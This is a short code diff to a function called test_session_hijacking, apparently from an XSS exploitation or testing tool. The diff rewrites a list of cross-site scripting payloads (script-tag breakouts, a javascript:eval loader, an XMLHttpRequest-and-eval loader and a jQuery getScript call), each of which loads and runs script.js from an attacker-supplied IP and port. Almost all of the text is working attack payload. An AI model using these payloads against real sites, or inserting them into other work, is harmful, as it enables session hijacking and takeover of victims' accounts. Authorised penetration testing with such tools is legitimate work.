@@ -154,11 +154,11 @@ def test_session_hijacking(session, base_url, params, vuln_param, mode, ip, port
 
     session_hijacking_payloads = [
         f"<script src=http://{ip}:{port}/script.js></script>",
-        f"'><script src=http://{ip}/script.js></script>",
-        f'"><script src=http://{ip}/script.js></script>',
-        f"javascript:eval('var a=document.createElement(\'script\');a.src=\'http://{ip}/script.js\';document.body.appendChild(a)')",
-        f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{ip}/script.js");a.send();</script>',
-        f'<script>$.getScript("http://{ip}/script.js")</script>'
+        f"'><script src=http://{ip}:{port}/script.js></script>",
+        f'"><script src=http://{ip}:{port}/script.js></script>',
+        f"javascript:eval('var a=document.createElement(\'script\');a.src=\'http://{ip}:{port}/script.js\';document.body.appendChild(a)')",
+        f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{ip}:{port}/script.js");a.send();</script>',
+        f'<script>$.getScript("http://{ip}:{port}/script.js")</script>'
     ]
 
     params_dict = {p: "test@test.test" if 'email' in p or 'pass' in p else 'test' for p in params}
